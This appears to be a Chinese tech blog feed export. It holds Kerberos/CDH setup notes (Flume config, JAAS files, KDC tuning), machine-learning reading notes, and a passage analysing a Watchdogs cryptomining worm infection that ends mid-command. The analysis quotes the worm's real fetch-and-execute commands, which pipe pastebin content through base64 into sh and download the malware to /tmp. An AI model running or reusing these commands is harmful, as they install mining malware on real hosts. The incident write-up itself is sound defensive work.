class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">agent.sources = kafkaSource1</span><br><span class="line">agent.channels = kafkaChannel</span><br><span class="line">agent.sinks = hdfsSink</span><br><span class="line">agent.sources.kafkaSource1.channels = kafkaChannel</span><br><span class="line">agent.sinks.hdfsSink.channel = kafkaChannel</span><br><span class="line"></span><br><span class="line">agent.sources.kafkaSource1.type = org.apache.flume.source.kafka.KafkaSource</span><br><span class="line">agent.sources.kafkaSource1.zookeeperConnect = master126:2181</span><br><span class="line">agent.sources.kafkaSource1.topic = report.alarm,report.distance,report.track,report.acc,report.stop</span><br><span class="line">agent.sources.kafkaSource1.consumer.group.id = cloudera_mirrormaker</span><br><span class="line">agent.sources.kafkaSource1.kafka.consumer.timeout.ms = 100</span><br><span class="line">agent.sources.kafkaSource1.kafka.bootstrap.servers = master126:9092</span><br><span class="line">agent.sources.kafkaSource1.batchSize = 100</span><br><span class="line">agent.sources.kafkaSource1.batchDurationMillis = 1000</span><br><span class="line">agent.sources.kafkaSource1.kafka.consumer.security.protocol = SASL_PLAINTEXT</span><br><span class="line">agent.sources.kafkaSource1.kafka.consumer.sasl.mechanism = GSSAPI</span><br><span class="line">agent.sources.kafkaSource1.kafka.consumer.sasl.kerberos.service.name = kafka</span><br><span class="line"></span><br><span class="line">agent.channels.kafkaChannel.type = org.apache.flume.channel.kafka.KafkaChannel</span><br><span class="line">agent.channels.kafkaChannel.kafka.bootstrap.servers = master126:9092</span><br><span class="line">agent.channels.kafkaChannel.kafka.topic = source_from_kafka</span><br><span class="line">agent.channels.kafkaChannel.consumer.group.id = flume-consumer</span><br><span class="line">agent.channels.kafkaChannel.kafka.producer.timeout.ms = 2000</span><br><span class="line">agent.channels.kafkaChannel.kafka.producer.security.protocol = SASL_PLAINTEXT</span><br><span class="line">agent.channels.kafkaChannel.kafka.producer.sasl.mechanism = GSSAPI</span><br><span class="line">agent.channels.kafkaChannel.kafka.producer.sasl.kerberos.service.name = kafka</span><br><span class="line"></span><br><span class="line">agent.channels.kafkaChannel.kafka.consumer.timeout.ms = 2000</span><br><span class="line">agent.channels.kafkaChannel.kafka.consumer.security.protocol = SASL_PLAINTEXT</span><br><span class="line">agent.channels.kafkaChannel.kafka.consumer.sasl.mechanism = GSSAPI</span><br><span class="line">agent.channels.kafkaChannel.kafka.consumer.sasl.kerberos.service.name = kafka</span><br><span class="line"></span><br><span class="line">agent.sinks.hdfsSink.type = hdfs</span><br><span class="line">agent.sinks.hdfsSink.hdfs.kerberosKeytab= /hdfs-keytab/hdfs.keytab</span><br><span class="line">agent.sinks.hdfsSink.hdfs.kerberosPrincipal= hdfs@JIMI.COM</span><br><span class="line">agent.sinks.hdfsSink.hdfs.path = hdfs://master126:8020/test/data/flume/kafka/%Y%m%d</span><br><span class="line"><span class="meta">#</span>上传文件的前缀</span><br><span class="line">agent.sinks.hdfsSink.hdfs.filePrefix = %d_%&#123;topic&#125;</span><br><span class="line"><span class="meta">#</span>是否按照时间滚动文件夹</span><br><span class="line">agent.sinks.hdfsSink.hdfs.round = true</span><br><span class="line"><span class="meta">#</span>多少时间单位创建一个新的文件夹</span><br><span class="line">agent.sinks.hdfsSink.hdfs.roundValue = 24</span><br><span class="line"><span class="meta">#</span>重新定义时间单位</span><br><span class="line">agent.sinks.hdfsSink.hdfs.roundUnit = hour</span><br><span class="line"><span class="meta">#</span>是否使用本地时间戳</span><br><span class="line">agent.sinks.hdfsSink.hdfs.useLocalTimeStamp = true</span><br><span class="line"><span class="meta">#</span>积攒多少个Event才flush到HDFS一次</span><br><span class="line">agent.sinks.hdfsSink.hdfs.batchSize = 200</span><br><span class="line"><span class="meta">#</span>设置文件类型，可支持压缩</span><br><span class="line">agent.sinks.hdfsSink.hdfs.fileType = DataStream</span><br><span class="line"><span class="meta">#</span>多久生成一个新的文件</span><br><span class="line">agent.sinks.hdfsSink.hdfs.rollInterval = 7200</span><br><span class="line"><span class="meta">#</span>设置每个文件的滚动大小</span><br><span class="line">agent.sinks.hdfsSink.hdfs.rollSize = 1073741824</span><br><span class="line"><span class="meta">#</span>文件的滚动与Event数量无关</span><br><span class="line">agent.sinks.hdfsSink.hdfs.rollCount = 0</span><br><span class="line">agent.sinks.hdfsSink.hdfs.writeFormat = TEXT</span><br></pre></td></tr></table></figure><p>例子中的配置文件的最终效果是从kafka的多个topic report.stop等等读取数据之后通过kafka channel，然后根据不同的topic生成不同的文件。</p><h4 id="HUE中Oozie报错，时区错误"><a href="#HUE中Oozie报错，时区错误" class="headerlink" title="HUE中Oozie报错，时区错误"></a>HUE中Oozie报错，时区错误</h4><p>发现HUE的时间和实际时间有偏差，原因是HUE的时区默认是美国，要在配置里面修改，修改成东8区即可</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2w01fhhuuj20wo05bjrg.jpg" alt></p><h4 id="系统自带的无法识别的配置文件"><a href="#系统自带的无法识别的配置文件" class="headerlink" title="系统自带的无法识别的配置文件"></a>系统自带的无法识别的配置文件</h4><p>值得一提的是这边有个错误我花了好久才发现，CDH因为是高度集成的，里面很多配置文件都是自己生成的，像Kafka的Keytab配置文件，文件里面的内容并不正确，里面指定的KafkaClient和Server根本无法识别，更改之后才可以识别。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">KafkaClient &#123;</span><br><span class="line">   com.sun.security.auth.module.Krb5LoginModule required</span><br><span class="line">   doNotPrompt=true</span><br><span class="line">   useKeyTab=true</span><br><span class="line">   storeKey=true</span><br><span class="line"> keyTab="D:\\kafkaproducer\\KafkaKerberosProducer\\src\\main\\resources\\kafka.keytab"</span><br><span class="line">   principal="kafka/master126@JIMI.COM";</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Client &#123;</span><br><span class="line">   com.sun.security.auth.module.Krb5LoginModule required</span><br><span class="line">   useKeyTab=true</span><br><span class="line">   storeKey=true</span><br><span class="line"> keyTab="D:\\kafkaproducer\\KafkaKerberosProducer\\src\\main\\resources\\kafka.keytab"</span><br><span class="line">   principal="kafka/master126@JIMI.COM";</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><h3 id="11-Windows下访问Kerberos-CDH集群的WebUI界面"><a href="#11-Windows下访问Kerberos-CDH集群的WebUI界面" class="headerlink" title="11.Windows下访问Kerberos CDH集群的WebUI界面"></a>11.Windows下访问Kerberos CDH集群的WebUI界面</h3><p><a href="http://web.mit.edu/kerberos/dist/" target="_blank" rel="noopener">MIT Kerberos下载地址</a></p><p>先安装windows下的Kerberos安装包，无脑安装就行了。</p><p>接着配置krb5..ini文件，将krb5.conf的内容拷贝进来，切忌不要直接更改后缀名就使用</p><p>接着启动MIT Kerberos软件</p><p>使用我们在linux KDC上注册的管理员账号登录即可。我们登录不同的服务使用到的不用的账号，这个软件貌似会通过我们这个管理员账号自己搞定。</p><p>还有一种方法，需要使用Keytab，还涉及到文件权限的问题，因为上面的方法我很轻易就成功访问了WebUI，所以第二种方法就没有尝试。</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI4OTY3MTUyNg==&amp;mid=2247483853&amp;idx=1&amp;sn=442a8ba87c922857253a437affe42506&amp;chksm=ec2ad1c4db5d58d2933ae5cde4ab1a7443c944e94aca85b51cbd8e9f4f3772162a39074da49d&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">更多内容访问阿里巨佬Fayson的公众号</a></p><hr><h3 id="12-禁用Kerberos需要调整的设置"><a href="#12-禁用Kerberos需要调整的设置" class="headerlink" title="12.禁用Kerberos需要调整的设置"></a>12.禁用Kerberos需要调整的设置</h3><p>说明：设置可能会随着版本变化有所变化</p><p><strong>Zookeeper</strong></p><ul><li><code>enableSecurity (Enable Kerberos Authentication)</code> : false</li><li><code>zoo.cfg</code> 的Server 高级配置代码段（安全阀）写入skipACL: yes</li></ul><p><strong>HDFS</strong></p><ul><li><code>hadoop.security.authentication</code> : Simple</li><li><code>hadoop.security.authorization</code> : false</li><li><code>dfs.datanode.address</code> : 1004 (for Kerberos) 改为 50010 (default)</li><li><code>dfs.datanode.http.address</code> : 1006 (for Kerberos) 改为 50075 (default)</li><li><code>dfs.datanode.data.dir.perm</code> : 700 改为 755</li></ul><p><strong>HBase</strong></p><ul><li><code>hbase.security.authentication</code> : Simple</li><li><code>hbase.security.authorization</code> : false</li><li><code>hbase.thrift.security.qop</code> : none</li></ul><p><strong>Hue</strong></p><ul><li><code>Kerberos Ticket Renewer</code>: 删除或停用角色</li></ul><p><strong>Kafka</strong></p><ul><li><code>kerberos.auth.enable</code>: false</li></ul><p><strong>SOLR</strong></p><ul><li><code>solr Secure Authentication</code> : Simple</li></ul><hr><h3 id="13-集群同步脚本"><a href="#13-集群同步脚本" class="headerlink" title="13.集群同步脚本"></a>13.集群同步脚本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line">    #1 获取输入参数个数，如果没有参数，直接退出</span><br><span class="line">    pcount=$#</span><br><span class="line">    if((pcount==0)); then</span><br><span class="line">    echo no args;</span><br><span class="line">    exit;</span><br><span class="line">    fi</span><br><span class="line"></span><br><span class="line">    #2 获取文件名称</span><br><span class="line">    p1=$1</span><br><span class="line">    fname=`basename $p1`</span><br><span class="line">    echo fname=$fname</span><br><span class="line"></span><br><span class="line">    #3 获取上级目录到绝对路径</span><br><span class="line">    pdir=`cd -P $(dirname $p1); pwd`</span><br><span class="line">    echo pdir=$pdir</span><br><span class="line"></span><br><span class="line">    #4 获取当前用户名称</span><br><span class="line">    user=`whoami`</span><br><span class="line"></span><br><span class="line">    #5 循环</span><br><span class="line">    for((host=0; host&lt;2; host++)); do</span><br><span class="line">    echo ------------------- datanode$host --------------</span><br><span class="line">    rsync -rvl $pdir/$fname $user@datanode$host:$pdir</span><br><span class="line">    done</span><br></pre></td></tr></table></figure><p>要先安装rsync</p><p>yum install rsync</p><p>安装成功之后才能用这个同步命令</p><hr><h3 id="14-Kerberos优化"><a href="#14-Kerberos优化" class="headerlink" title="14.Kerberos优化"></a>14.Kerberos优化</h3><h4 id="美团优化实战"><a href="#美团优化实战" class="headerlink" title="美团优化实战"></a>美团优化实战</h4><p><strong>为什么要优化：</strong></p><p>线上单台KDC服务器最大承受QPS是多少？哪台KDC的服务即将出现压力过大的问题？为什么机器的资源非常空闲，KDC的压力却会过大？如何优化？优化后瓶颈在哪儿？如何保证监控指标的全面性、可靠性和准确性？这都是本文需要回答的问题。从本次优化工作达成的最终结果上来看，单台服务器每秒的处理性能提升16倍左右，另外通过共享内存的方式设计了一个获取KDC各项核心指标的接口，使得服务的可用性进一步提升。</p><p>名词：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v66w9mt3j212m0hw75j.jpg" alt></p><p>下图是美团的架构，整个KDC服务都部署在同一个IDC</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v697svjwj21a40zc771.jpg" alt></p><p><strong>主要优化工作</strong></p><p>通过对KDC原理的分析，很容易判断只有前两部分才可能直接给KDC服务带来压力，因此本文涉及到的工作都将围绕上一部分的前两个环节展开分析。本次优化工作采用Grinder这一开源压测工具，分别对AS、TGS两个请求过程，采用相同机型（保证硬件的一致性）在不同场景下进行了压力测试。</p><p>优化之前，线上KDC服务启动的单进程；为最低风险的完成美团和点评数据的融合，KDC中keytab都开启了PREAUTH属性；承载KDC服务的部分服务器没有做RAID。KDC服务出现故障时，机器整体资源空闲，怀疑是单进程的处理能力达到上限；PREAUTH属性进一步保证提升了KDC服务的安全性，但可能带来一定的性能开销；如果线上服务器只加载了少量的keytab信息，那么没有被加载到内存的数据必然读取磁盘，从而带来一定的IO损耗。</p><p>因此本文中，对以下三个条件进行变动，分别进行了测试：</p><ol><li>对承载KDC服务的物理机型是否做RAID10；</li><li>请求的keytab在库中是否带有PRAUTH属性；</li><li>KDC是否启动多进程（多进程设置数目和物理机核数一致）。（实际测试工作中进行了多次测试）</li></ol><p><strong>Client和AS交互过程的压测</strong></p><p>下图为AS压测的一组平均水平的测试数据，使用的物理机有40核，因此多进程测试启动40个进程。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6aqpeh0j212i0gumxq.jpg" alt></p><p>分析表中的数据，很容易提出如下问题从而需要进一步探索：</p><ol><li>比较表中第一行和第二行、第三行和第四行，主机做不做RAID为什么对结果几乎无影响？</li></ol><p>该四组（测试结果为49、53、100和104所在表2中的行）数据均在达到处理能力上限一段时间后产生认证失败，分析机器的性能数据，内存、网卡、磁盘资源均没有成为系统的瓶颈，CPU资源除了某个CPU偶尔被打满，其他均很空闲。分析客户端和服务端的认证日志，服务端未见明显异常，但是客户端发现大量的Socket Timeout错误（测试设置的Socket超时时间为30s）。由于测试过程中，客户端输出的压力始终大于KDC的最大处理能力，导致KDC端的AS始终处于满负荷状态，暂时处理不了的请求必然导致排队；当排队的请求等待时间超过设置的30s后便会开始超时从而认证出错，且伴随机器某一CPU被打满（如图3）。 显然KDC单进程服务的处理能力已经达到瓶颈且瓶颈存在单核CPU的处理能力，从而决定向多进程方向进行优化测试。</p><p>单进程KDC打满某一CPU：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6d08i8dj20xk0cewga.jpg" alt></p><p>下图为本次压力测试的一个通用模型，假设KDC单位时间内的最大处理能力是A，来自客户端的请求速率稳定为B且 B&gt;A ；图中黄色区域为排队的请求数，当某一请求排队超过30s，便会导致Socket Timedout错误。</p><p>AS处理能力和Client压力模型：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6dxwvacj21380pqwg3.jpg" alt></p><ol start="2"><li>比较上上一张表中第1和3行、第2和4行、第7和8行相比，为什么有PREAUTH属性的认证QPS大致是无该属性处理能力的一半？</li></ol><p>如果Client的keytab在KDC的库中不带有PREAUTH这一属性，Client发送请求，KDC的AS模块验证其合法性之后返回正确的结果；整个过程只需要两次建立链接进行交互便可完成。如果带有PREAUTH属性，意味着该keytab的认证启动了Kerberos 5协议中的 pre-authentication概念：当AS模块收到Client的请求信息后；故意给Client返回一个错误的请求包，Client会“领悟到”这是KDC的AS端需要进行提前认证；从而Client获取自己服务器的时间戳并用自己的密钥加密发送KDC，KDC解密后和自身所在服务器的时间进行对比，如果误差在能容忍的范围内；返回给Client正确的TGT响应包；过程如下图所示。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6fxvq1xj220o0d0juw.jpg" alt></p><ol start="3"><li>根据对问题2的分析，CPU占用表中第5和7行的值的比例应该近似为1:2，为什么第5行的值只有115，结果和理论差距如此之大？</li></ol><p>KDC的库中对客户端的keytab开启PREAUTH属性，客户端每认证一次，KDC需要将该次认证的时间戳等信息写到本次磁盘的BDB数据库的Log中；而关闭PREAUTH属性后，每次认证只需要从库中读取数据，只要给BDB数据库分配的内存足够大，就可以最大程度的减少和本次磁盘的交互。KDC40进程且开启PRAUTH，其AS处理能力的QPS只有115，分析机器性能的相关指标，发现瓶颈果然是单盘的IO，如图6所示。使用BDB提供的工具，查看美团数据平台KDC服务的BDB缓存命中率为99%，如下图所示：</p><p>无RAID多KDC进程服务器磁盘IO：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6i16k8hj21140ccgmj.jpg" alt></p><p>美团KDC缓存命中率：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6jctl01j20pa0bw76t.jpg" alt></p><ol start="4"><li>KDC AS处理能力在多进程做RAID条件下，有无preauth属性，KDC服务是否有瓶颈？如果有在哪里？</li></ol><p>经多次实验，KDC的AS处理能力受目前物理机CPU处理能力的限制，图8为有PREAUTH属性的CPU使用情况截图，无PREAUTH结果一致。</p><p>40进程有PREAUTH，AS对CPU资源的使用情况：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6jsf7r8j20z2154qk7.jpg" alt></p><p><strong>Client和TGS交互过程的压测：</strong></p><p>下表为TGS压测的一组平均水平的测试数据：</p><p>TGS压测：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6kt9fnvj212g0h2t9a.jpg" alt></p><p>可以发现KDC对TGS请求的处理能力和主机是否做RAID无关,结合KDC中TGS的请求原理，就较容易理解在BDB缓存命中率足够高的条件下，TGS的请求不需要和本次磁盘交互；进一步做实验，也充分验证了这一点，机器的磁盘IO在整个测试过程中，没有大的变化，如图所示，操作系统本身偶尔产生的IO完全构不成KDC的服务瓶颈。KDC单进程多进程的对比，其处理瓶颈和AS一致，均受到CPU处理能力的限制（单进程打满某一CPU，多进程几乎占用整台机器的CPU资源）。从Kerberos的设计原理分析，很容易理解，无论KDC库中的keytab是否带有PREAUTH属性，对TGS的处理逻辑几乎没有影响，压测的数据结果从实际角度验证了这一点。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6m4az4cj224a0tawhe.jpg" alt></p><p><strong>C：其它问题</strong></p><p>Client和KDC的交互，支持TCP和UDP两种协议。在网络环境良好的情况下，两种协议的KDC的测试结果理论上和实际中几乎一致。但是在原生代码中，使用TCP协议，在客户端给KDC造成一定压力持续6s左右，客户端开始认证出错，在远未达到超时时限的情况下，Client出现了<code>socket reset</code>类的错误。KDC查看内核日志，发现大量<code>possible SYN flooding on port 8089(KDC的服务端口). Sending cookies</code>，且通过<code>netstat -s</code>发现机器的<code>xxxx times the listen queue of a socket overflowed</code>异常增高，种种现象表明可能是服务端的半连接队列、全连接队列中的一个或者全部被打满。主要原理如图10所示：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6mjf0tvj20ws0wuq6q.jpg" alt></p><p>发现KDC服务所在服务器：半队列<code>/proc/sys/net/ipv4/tcp_max_syn_backlog为2048</code>。</p><p>全队列：1）系统参数<code>/proc/sys/net/core/somaxconn＝65535</code>，查看代码<code>listen()</code>函数的传入值为5。</p><p>故而判断TCP的瓶颈在于全队列，因此目标为将<code>listen</code>函数的第二个<code>backlog</code>参数变成可控可传入。</p><p><strong>KDC可监控的设计和实现</strong></p><p>开源社区对Kerberos实现的KDC完全没有对外暴露可监控的接口，最初线上的场景主要通过检索Log进行相关指标的监控，在统计服务QPS、各种错误的监控等方面，存在准确准确监控难的尴尬局面。为了实现对KDC准确、较全面的监控，对KDC进行了二次开发，设计一个获取监控指标的接口。对监控的设计，主要从以下三个方面进行了考虑和设计。</p><p><strong>A.设计上的权衡</strong></p><ol><li><p>监控的设计无论在什么场景下，都应该尽可能的不去或者最小程度的影响线上的服务，本文最终采用建立一块共享内存的方式，记录各个KDC进程的打点信息，实现的架构如图11所示。每个KDC进程对应共享内存中的一块区域，通过n个数组来存储KDC n个进程的服务指标：当某个KDC进程处理一个请求后，该请求对监控指标的影响会直接打点更新到其对应的Slot 数组中。更新的过程不受锁等待更新的影响，KDC对监控打点的调用仅仅是内存块中的更新，对服务的影响几乎可以忽略不计。相比其他方式，在实现上也更加简单、易理解。</p></li><li><p>纪录每个KDC进程的服务情况，便于准确查看每个进程的对请求的处理情况，有助于定位问题多种情况下出现的异常，缩短故障的定位时间。例如：能够准确的反应出每个进程的请求分布是否均匀、请求处理出现异常能够定位到具体是某个进程出现异常还是整体均有异常。</p><p>KDC监控设计的整体架构：</p></li></ol><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6oip712j21v80y2wlc.jpg" alt></p><p><strong>B.程序的可拓展性</strong></p><p>任何指标的采集都是随着需求进行变更的，如果程序设计上不具有良好的扩展性，会后续的指标扩展带来很大的困扰。第一版KDC监控指标的采集只区分请求的成功与失败两种类型，美团数据平台KDC库中所有的keytab都具有PREAUTH属性。根据上文可知，去掉PREAUTH属性后，AS请求的QPS能够提升一倍。后续随着服务规模的进一步增长，如果AS请求的处理能力逐步成为瓶颈，会考虑去掉PREAUTH属性。为了准确监控去掉PREAUTH属性这一过程是否有、有多少请求出现错误，需要扩展一个监控指标，因此有了KDC监控的第二版。整个过程只需要修改三个地方，完成两个功能的实现：</p><ol><li>添加指标 ；</li><li>打点逻辑的添加。</li></ol><p>整个修改过程简单明了，因此，该KDC监控程序的设计具有非常好的扩展性。图12为监控指标的罗列和注释：</p><p>KDC监控指标及含义：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6pmygs4j21440ri7d2.jpg" alt></p><p><strong>C.接口工具kstat的设计</strong></p><p>获取KDC监控指标的接口工具主要分为两种：</p><ol><li>获取当前每个KDC进程对各个指标的累积值，该功能是为了和新美大的监控平台Falcon结合，方便实现指标的上报实现累加值和分钟级别速率值的处理；</li><li>获取制定次数在制定时间间隔内每个进程监控指标的瞬时速率，最小统计间隔可达秒级，方便运维人员登陆机器无延迟的查看当前KDC的服务情况，使其在公司监控系统不可用的情况下分析服务的当前问题。具体使用见下图。</li></ol><p>kstat的使用帮助和两种功能使用样例：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6qjmveyj21s60len2w.jpg" alt></p><p><strong>总结：</strong></p><p>通过本次对KDC服务的压测实验和分析，总结出KDC最优性能的调整方案为：</p><ol><li>KDC服务本身需要开启多进程和以充分利用多核机器的CPU资源，同时确保BDB的内存资源足够，保证其缓存命中率达到一定比例（越高越好，否则查询库会带来大量的磁盘读IO）；</li><li>选择的物理机要做RAID，否则在库中keytab带有PREAUTH属性的条件下，会带来大量的写，容易导致磁盘成为KDC的性能瓶颈。通过建立一块共享内存无锁的实现了KDC多进程指标的收集，加上其良好的扩展性和数据的精确性，极大的提高了KDC服务的可靠性。</li></ol><p>相比原来线上单进程的处理能力，目前单台服务器的处理性能提升10+倍以上。本次工作没有详细的论述TCP协议中半队列、全队列的相关参数应该如何设定才能达到最优，和服务本身结合到一起，每个参数的变更带来的影响具体是什么因为过于复杂，还没有介绍。</p><hr><p><a href="https://tech.meituan.com/2019/02/14/data-security-platform-construction-practice-jiangjunling.html" target="_blank" rel="noopener">美团数据安全平台建设实践</a>  介绍了权限模型和解决方案等</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;从18年底开始，公司的服务器经常受到各种挖矿脚本病毒的公司，Java后端Redis漏洞层出不穷，Hadoop这边MR的提交权限BUG也被利用了，于是决定调研Kerberos，发现Kerberos是一个巨大的坑，在此记录下笔记，作为我的Github Pages第一篇文档，希望后来人少走弯路。此文可能分为几次更新。&lt;/p&gt;
&lt;p&gt;第一次更新：2019-4-29&lt;/p&gt;
&lt;p&gt;第二次更新：2019-5-10&lt;/p&gt;
    
    </summary>
    
      <category term="Hadoop" scheme="http://yoursite.com/categories/Hadoop/"/>
    
      <category term="Security" scheme="http://yoursite.com/categories/Hadoop/Security/"/>
    
    
      <category term="Kerberos" scheme="http://yoursite.com/tags/Kerberos/"/>
    
  </entry>
  
  <entry>
    <title>Machine Learning</title>
    <link href="http://yoursite.com/2019/05/10/Machine%20Learning/"/>
    <id>http://yoursite.com/2019/05/10/Machine Learning/</id>
    <published>2019-05-10T11:50:31.891Z</published>
    <updated>2019-05-10T06:59:57.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>周志华的同名书籍的阅读笔记，入门读物</p></blockquote><a id="more"></a> <h2 id="第一章-绪论"><a href="#第一章-绪论" class="headerlink" title="第一章 绪论"></a>第一章 绪论</h2><h3 id="1-1-引言"><a href="#1-1-引言" class="headerlink" title="1.1 引言"></a>1.1 引言</h3><h3 id="1-2-基本术语"><a href="#1-2-基本术语" class="headerlink" title="1.2 基本术语"></a>1.2 基本术语</h3><p>classification：预测结果是离散值（好瓜、坏瓜）</p><p>regression：预测结果是连续值（成熟度0.95 0.37）</p><p>binary classification：只涉及两个结果的分类，通常称之为一个为positive class 一个为 negative class</p><p>multi-class classification：多分类</p><p>预测任务是希望通过训练对训练集{(x<sub>1</sub>,y<sub>1</sub>),(x<sub>2</sub>,y<sub>2</sub>)…(x<sub>m</sub>,y<sub>m</sub>)}进行学习，建议一个从输入空间X到输出空间Y的映射，对于二分类任务，通常另Y = {-1,1}或者{0,1}，对多分类任务，|Y|&gt;2，回归任务，Y = R，R是实数集。</p><p>学习完毕模型后，使用其预测的过程叫做测试(testing)，被预测的样本称为“测试样本”(testing sample)，例如在学得f之后，对测视例x，可得到其预测目标y = f(x).</p><p>聚类（clustering），即将训练集中的西瓜分为若干组（cluster），在聚类学习中，分的类我们是事先不知道的，学习过程中使用的训练样本通常不配拥有标记信息。</p><p>根据训练数据是否用哦与标记信息，学习任务大致可以划分为两大类：“监督学习（supervised learning）和非监督学习（unsupervised learning），分类和回归是前者的代表，聚类是后者的代表”</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;周志华的同名书籍的阅读笔记，入门读物&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Reading notes" scheme="http://yoursite.com/categories/Reading-notes/"/>
    
      <category term="Mechine Learning" scheme="http://yoursite.com/categories/Reading-notes/Mechine-Learning/"/>
    
    
      <category term="Reading notes" scheme="http://yoursite.com/tags/Reading-notes/"/>
    
      <category term="Mechine Learning" scheme="http://yoursite.com/tags/Mechine-Learning/"/>
    
  </entry>
  
  <entry>
    <title>hadoop病毒案例分析</title>
    <link href="http://yoursite.com/2019/05/10/%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2019/05/10/大数据病毒分析/</id>
    <published>2019-05-10T11:50:28.177Z</published>
    <updated>2019-05-10T03:02:03.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>京东云和公司集群分别遇到过一次挖矿脚本，经过分析，发现两次挖矿事件有所不同，在这篇文档记录下两次挖矿事件的异同、总结和反思。</p></blockquote><a id="more"></a> <h3 id="第二次事件分析"><a href="#第二次事件分析" class="headerlink" title="第二次事件分析"></a>第二次事件分析</h3><p>我遇到的两次挖矿事件分别是由于<code>Hadoop Yarn REST API</code>未授权漏洞和<code>Redis</code>未授权访问漏洞这两种常见的配置问题引发的。</p><p>目前可以确定的是，第二次遇到的是Watchdogs蠕虫，这种蠕虫病毒第一次发现是2019年2月20日，阿里云安全监测到一起大规模挖矿事件，判断为Watchdogs蠕虫导致，该蠕虫短时间内即造成大量Linux主机沦陷，一方面是利用Redis未授权访问和弱密码这两种常见的配置问题进行传播，另一方面从known_hosts文件读取ip列表，用于登录信任该主机的其他主机。这两种传播手段都不是第一次用于蠕虫，但结合在一起爆发出巨大的威力。</p><p>蠕虫感染路径如下图：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v117hz8tj20z80iygok.jpg" alt></p><p>蠕虫传播方式：</p><p>攻击者首先扫描存在未授权访问或弱密码的Redis，并控制相应主机去请求以下地址：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pastebin.com/raw/sByq0rym</span><br></pre></td></tr></table></figure><p>该地址包含的命令是请求、base64解码并执行另一个url地址的内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(curl -fsSL https://pastebin.com/raw/D8E71JBJ||wget -q -O- https://pastebin.com/raw/D8E71JBJ)|base64 -d|sh</span><br></pre></td></tr></table></figure><p>而<a href="https://pastebin.com/raw/D8E71JBJ" target="_blank" rel="noopener">https://pastebin.com/raw/D8E71JBJ</a> 的内容解码后为一个bash脚本，脚本中又包含下载恶意程序Watchdogs的指令。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(curl -fsSL http://thyrsi.com/t6/672/1550667479x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667479x1822611209.jpg -O /tmp/watchdogs) 